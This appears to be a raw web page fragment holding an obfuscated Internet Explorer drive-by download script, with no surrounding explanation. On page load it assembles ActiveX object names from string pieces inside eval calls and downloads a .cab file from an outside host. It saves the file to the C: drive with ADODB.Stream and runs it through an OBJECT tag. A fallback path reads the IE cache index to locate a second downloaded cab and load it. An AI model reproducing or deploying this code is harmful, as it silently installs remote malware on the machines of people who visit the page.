   <iframe name=ifr id=ifr>x</iframe>
   <SCRIPT>

   var tmp=''+document.location.href;
   var cust=tmp.split(/cust/)[1];
   cust = cust.replace(/[^0-9]/g, "");

       var URL = 'http://www2.log'+'ih.com/files/ied_s7_'+cust+'.cab?2';
       try {
       var x;
       eval('x = new Act'+'iveXO'+'bject("Micros'+'oft.XMLH'+'TTP")');
           x.Open("GET",URL,0);
           x.Send();
       var s;
       eval ('s = new Act'+'iveXOb'+'ject("A'+'DOD'+'B.St'+'ream")');
       eval("s.M"+"ode = 3");
       eval("s.T"+"ype = 1");
       eval("s.O"+"pen()");
       eval("s.W"+"rite(x.responseBody)");
       eval('s.S'+'aveToFile("C:\\\\ied_s7.cab",2)');
       }
       catch(ex) {
           URL = 'http://www2.log'+'ih.com/files/explorer'+cust+'.cab';
       var f0;
       eval ('f0=new Act'+'iveXOb'+'ject("Microsoft.XML'+'HTTP")');
       f0.Open("GET",URL, false);
       f0.Send();
       xxy=GetObject("C:/WINDOWS/Tempor~1/Content.IE5/INDEX.DAT","htmlfile");
       var x=setTimeout("iecache_step2();",1000);
       }


       function iecache_step2(){
       var aa = new Array();
       var bb =xxy.body.innerText.substr(30,80).match(/[A-Z0-9]{9}/g);
       if (bb && bb.length == 4) {
        for (i=0;i<bb.length;i++) {
           aa[aa.length] = bb[i].substr(0,8);
           aa[aa.length] = bb[i].substr(1,8);
        }
       } else {
           aa=xxy.body.innerText.substr(30,80).match(/[A-Z0-9]{8}/g);
       }
       for(var ii=0;ii<aa.length;ii++) {
           ifr.document.write(aa[ii] + '<OBJECT CLASSID=clsid:11111111-1111-1111-1111-111111113458 CODEBASE=C:/WINDOWS/Tempor~1/Content.IE5/' + aa[ii] + '/explorer'+cust+'[1].cab ID=i></OBJECT><br>');
       }

       }
   </SCRIPT>
   <OBJECT CLASSID=clsid:11111111-1111-1111-1111-111191113457 CODEBASE=c:/ied_s7.cab ID=i></OBJECT>
